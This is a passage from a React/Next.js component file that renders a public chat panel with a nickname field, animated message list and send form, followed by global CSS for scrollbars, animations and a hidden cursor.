                      <p className="text-xs font-bold text-gray-500 mt-2 tracking-widest uppercase">Public Terminal</p>
                    </div>
                    <div className="flex items-center gap-2">
                      <input 
                        type="text" 
                        value={nickname}
                        onChange={(e) => setNickname(e.target.value)}
                        placeholder="Anonymous"
                        maxLength={15}
                        className="bg-black border border-white/10 rounded-lg px-3 py-2 text-xs text-white focus:border-cyan-500 focus:outline-none w-32"
                      />
                      <MagneticButton onClick={() => setRequestModalOpen(true)} className="p-2.5 bg-black border border-white/10 rounded-lg text-cyan-400 hover:bg-cyan-950/30 transition-all cursor-pointer">
                        <Bell size={16} />
                      </MagneticButton>
                    </div>
                  </div>
                  
                  <div className="overflow-y-auto flex-1 p-6 space-y-4 custom-scrollbar relative z-0 flex flex-col">
                    {chatLoading ? (
                      <div className="flex items-center justify-center h-full text-gray-500">
                        <svg className="animate-spin h-8 w-8 text-cyan-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                      </div>
                    ) : messages.length === 0 ? (
                      <div className="flex flex-col items-center justify-center h-full text-gray-500 space-y-4 animate-in fade-in duration-1000">
                        <MessageSquare size={32} className="text-gray-600" />
                        <p className="font-bold text-sm text-gray-400 uppercase tracking-widest">No messages yet</p>
                      </div>
                    ) : (
                      <div className="flex-1 space-y-6">
                        {messages.map((msg) => {
                          const isMe = msg.sender === (nickname || 'Anonymous');
                          return (
                            <motion.div 
                              initial={{ opacity: 0, y: 10 }}
                              animate={{ opacity: 1, y: 0 }}
                              key={msg.id}
                              className={`flex flex-col ${isMe ? 'items-end' : 'items-start'}`}
                            >
                              <span className="text-[10px] text-gray-500 font-bold mb-1 uppercase tracking-wider">{msg.sender}</span>
                              <div className={`px-4 py-3 rounded-2xl max-w-[80%] ${isMe ? 'bg-cyan-500 text-black font-bold rounded-tr-sm' : 'bg-white/5 border border-white/10 text-gray-200 rounded-tl-sm'}`}>
                                <p className="text-sm break-words">{msg.content}</p>
                              </div>
                              <span className="text-[9px] text-gray-600 mt-1">
                                {new Date(msg.createdAt).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                              </span>
                            </motion.div>
                          )
                        })}
                        <div ref={chatEndRef} />
                      </div>
                    )}
                  </div>

                  <div className="p-4 border-t border-white/5 bg-black/50 shrink-0">
                    <form onSubmit={handleSendMessage} className="flex gap-3">
                      <input 
                        type="text" 
                        value={chatInput}
                        onChange={(e) => setChatInput(e.target.value)}
                        placeholder="Type a message..."
                        className="flex-1 bg-[#121214] border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:border-cyan-500 focus:outline-none transition-colors"
                      />
                      <MagneticButton type="submit" disabled={!chatInput.trim()} className="px-5 bg-cyan-500 text-black font-bold rounded-xl disabled:opacity-50 flex items-center gap-2 hover:shadow-[0_0_15px_rgba(34,211,238,0.5)] transition-all">
                        SEND <Send size={16} />
                      </MagneticButton>
                    </form>
                  </div>
                </div>
              </Tilt>
            </motion.div>

          </div>
        </div>

        <style jsx global>{`
          .custom-scrollbar::-webkit-scrollbar {
            width: 8px;
          }
          .custom-scrollbar::-webkit-scrollbar-track {
            background: transparent;
          }
          .custom-scrollbar::-webkit-scrollbar-thumb {
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
          }
          .custom-scrollbar:hover::-webkit-scrollbar-thumb {
            background-color: rgba(255, 255, 255, 0.2);
          }
          @keyframes progress {
            from { background-position: 1rem 0; }
            to { background-position: 0 0; }
          }
          @keyframes shimmer {
            100% { transform: translateX(100%); }
          }
          @keyframes grid-move {
            0% { transform: rotateX(75deg) translateY(0); }
            100% { transform: rotateX(75deg) translateY(40px); }
          }
          body {
            cursor: none;
            background-color: #050505;
          }
          a, button, input {
            cursor: none !important;
          }
        `}</style>
      </main>
    </>
  );
}
